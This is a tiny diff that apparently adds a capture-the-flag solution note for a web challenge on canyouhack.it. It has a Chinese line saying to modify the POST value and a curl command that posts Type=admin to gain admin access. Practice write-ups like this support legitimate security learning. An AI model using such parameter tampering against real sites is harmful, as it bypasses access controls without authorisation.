@@ -1,0 +1,2 @@
+修改 POST 值
+curl -d Type=admin http://canyouhack.it/Content/Challenges/Web/Web7.php
